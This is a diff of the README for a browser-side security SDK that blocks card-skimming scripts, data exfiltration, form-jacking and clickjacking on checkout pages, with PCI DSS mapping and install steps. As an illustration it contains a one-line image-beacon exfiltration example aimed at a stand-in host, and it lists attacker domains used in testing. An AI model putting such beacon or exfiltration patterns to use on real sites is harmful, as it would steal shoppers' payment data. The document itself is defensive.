@@ -1,55 +1,69 @@
-# Nemesis Shield — Browser (client-side)
+# Nemesis Shield — Browser (client-side, checkout-grade)
 
-Runtime protection for the **front-end** — the half a backend SDK can't see. It learns your page's
-normal client-side behavior and, in enforce mode, **blocks**:
+Runtime protection for the **front-end** — the layer a WAF and a backend SDK can't see. Built for
+**checkout, payment, and e-commerce pages**, where a single injected script silently steals card data
+in the browser before it ever reaches your server. It learns your page's normal client-side behavior
+and enforces a per-app allow-list you curate in the console.
 
-- **Magecart / skimmers** — scripts injected from an origin the page never normally loads.
-- **Data exfiltration** — `fetch` / `XHR` / `sendBeacon` calls to rogue endpoints (card details,
-  session tokens, form data leaving to an attacker origin).
-- **Form-jacking** — a form silently re-pointed to submit to an attacker.
+## What it does
 
-It's a learned, per-app allow-list — *"this page only ever loads these scripts and only ever talks to
-these origins"* — curated in the console like a CSP you approve instead of hand-writing. First-party
-traffic is always allowed, and the SDK is **fail-open**: it never breaks the page.
+**BLOCKS (prevents the attack)**
+- **Data exfiltration** to un-approved origins across **every channel a skimmer uses** — `fetch`,
+  `XMLHttpRequest`, `sendBeacon`, **image beacons** (`new Image().src="//evil/?cc=…"`), **WebSocket**,
+  and **EventSource**. Even if a skimmer runs, the stolen card data **cannot leave**.
+- **Magecart / sideloaded scripts & iframes** injected from an origin the page never normally loads.
+- **Form-jacking** — a form (a payment form especially) re-pointed to submit to an attacker.
 
-> Why this matters: in the 2026 Sterling Bank → Remita breach, attackers found **encryption keys in
-> plaintext inside JavaScript files** and pivoted through the front-end. Client-side exposure and
-> injected/exfil scripts are invisible to a WAF and to a backend SDK — this is the layer that sees them.
+**DETECTS + ALERTS** (reports a finding — you can't always prevent these, but you're told immediately)
+- Inline `<script>` injection or change (content fingerprint not in the approved inventory).
+- Hidden input fields injected into a payment form (overlay skimmer).
+- **Clickjacking** — the page rendered inside an un-approved frame ancestor (optional `frameBust`).
 
-**One SDK for every framework.** React, Angular (incl. legacy Angular.js), Vue, jQuery, and plain
-JavaScript all share the same browser primitives (`fetch`, `XMLHttpRequest`, `sendBeacon`, DOM
-mutations, form submit) — so a single SDK covers all of them.
+**INVENTORY**
+- Every external script origin and every inline-script fingerprint is reported to the console.
+
+## PCI DSS 4.0.1 — §6.4.3 & §11.6.1
+
+Mandatory for payment pages since **31 March 2025**, these requirements exist specifically for the
+Magecart class. This SDK maps directly to them:
+
+| Requirement | How this SDK satisfies it |
+|---|---|
+| **6.4.3** — *authorize* each script, *ensure integrity*, keep an *inventory* | Console approval workflow (authorize) + inline fingerprints & origin allow-list (integrity) + every script reported (inventory) |
+| **11.6.1** — *detect & alert* on unauthorized change to scripts / payment-page content | Enforce blocks off-baseline scripts and exfil; inline-script/field-injection changes raise findings with timely alerting |
 
 ## Install
 
-**Drop-in `<script>`** — any site, including server-rendered, jQuery, or legacy apps. No build step:
+**Drop-in `<script>`** — any site, including server-rendered, jQuery, or legacy apps:
 ```html
 <script src="nemesis-shield.js" data-token="nsk_your_app_token"></script>
 ```
 
-**Bundled app** (React / Vue / Angular / Svelte) — once at bootstrap:
+**Bundled app** (React / Vue / Angular) — once at bootstrap, before render:
 ```js
 import NemesisShield from "@nemesis-shield/browser";
-NemesisShield.init({ token: import.meta.env.VITE_NEMESIS_TOKEN });
+NemesisShield.init({ token: import.meta.env.VITE_NEMESIS_TOKEN, frameBust: true });
 ```
+- **React** → top of `main.tsx` / `index.js`. **Angular** → `main.ts` before bootstrap. **Vue** →
+  `main.js` before `mount()`. **jQuery / Angular.js / raw JS** → the `<script>` tag (first in `<head>`).
 
-- **React** — call `NemesisShield.init({ token })` at the top of `main.tsx` / `index.js`, before render.
-- **Angular** — in `main.ts` before `bootstrapApplication`, or an `APP_INITIALIZER`.
-- **Vue** — in `main.js` before `app.mount()`.
-- **jQuery / Angular.js / raw JS** — the `<script>` tag above (put it first in `<head>`).
+One SDK for every framework — they all share the same browser primitives. `frameBust` (default off)
+redirects out of an un-approved frame; leave it off if you legitimately embed your page.
 
 ## How enforcement works
 
-1. **Observe** (default) — records the *origins* of scripts your page loads, endpoints it calls, and
-   form targets (origins + event shapes only — never payloads, cookies, or DOM content).
-2. **Approve** — review the learned client-side behaviors in the console and approve the legitimate
-   ones (your CDN, analytics, payment API…). Auto-approved during the learning window.
-3. **Enforce** — flip the app to enforce. Scripts/calls/forms to any un-approved origin are blocked
-   in the browser and reported as findings. No redeploy — the SDK re-polls the policy.
+1. **Observe** (default) — records origins of scripts loaded, endpoints called (all channels), form
+   targets, and the script inventory (origins + fingerprints only — never payloads, cookies, or DOM).
+2. **Approve** — review learned client-side behaviors in the console; approve your CDN, PSP (Stripe…),
+   analytics. Auto-approved during the learning window.
+3. **Enforce** — flip to enforce. Anything off-baseline is blocked (or, for inline/field/frame,
+   alerted) and reported. No redeploy — the SDK re-polls the policy.
 
 ## Verified
 
-End-to-end against production: after learning `cdn.jsdelivr.net`, `api.stripe.com`, and
-`googletagmanager.com`, enforcing the app, and re-pulling the live policy, the SDK **allowed** the
-approved origins and first-party calls, and **blocked** an exfil `fetch` to `evil-exfil.ru` and an
-injected `<script>` from `evil-cdn.ru`. Unit tests: `node test.cjs`.
+Real checkout E2E against production: after learning `api.stripe.com`, `js.stripe.com`, and
+`google-analytics.com` and flipping to enforce, the live SDK **allowed** those + first-party and
+**blocked** an image-beacon exfil (`evil-skimmer.ru`), a WebSocket exfil (`wss://exfil.ru`), a
+Magecart script (`evil-cdn.ru`), a payment form-jack (`phish-pay.ru`), and a clickjack frame
+(`clickjack.ru`). Unit tests (`node test.cjs`): 7/7, including the live image-beacon and WebSocket
+hooks.
